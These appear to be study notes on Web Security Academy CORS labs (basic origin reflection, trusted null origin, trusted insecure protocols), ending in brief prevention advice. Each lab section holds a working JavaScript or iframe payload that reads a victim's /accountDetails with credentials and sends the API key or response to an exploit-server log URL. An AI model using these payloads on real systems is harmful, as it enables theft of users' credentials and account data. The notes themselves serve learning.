# Cross Origin Resource Sharing

## Lab: CORS vulnerability with basic origin reflection
`/accountDetails` endpoint response headers include `Access-Control-Allow-Credentials: true/`, which means CORS enabled. Visiting this endpoint successfully in a new tab can verify this.

```html
<script>
fetch('https://0aff00e0032c129a802e174b0051007c.web-security-academy.net/accountDetails', {credentials:'include'})
    .then(r => r.json())
    .then(j => {
        document.location = "https://exploit-0a4a007303e4120780a21602017e0088.exploit-server.net/log?key=" + j.apikey;
    })
</script>
```

## Lab: CORS vulnerability with trusted null origin

iframe srcdoc can make Origin header to be null.  
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0ad7003d043537e880f1fee700bd0077.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://exploit-0a59000f046037f6807efd0c01f800f0.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>">
</iframe>
```


## Lab: CORS vulnerability with trusted insecure protocols

**IMPORTANT**: This lab needs you to enable third-party cookies.  

This work for "View Exploit", but not geting administrator request after delievered.

```html
    <script>
        document.location="http://stock.0a22009104211e5a80c844d600a3000c.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a22009104211e5a80c844d600a3000c.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {document.location='https://exploit-0a2b0010040d1e598057439701bd0016.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
    </script>
```

I think there something wrong with this lab. Even deliver this simple version to victim, there won't be this request logged.
```html
<script>
      document.location='https://exploit-0a2b0010040d1e598057439701bd0016.exploit-server.net/log?key=wuhao';
</script>
```


## Prevention:

1. Carefully set `Access-Control-Allow-Origin`, whitelist, no `null`, no wildcards;
2. Server-side security.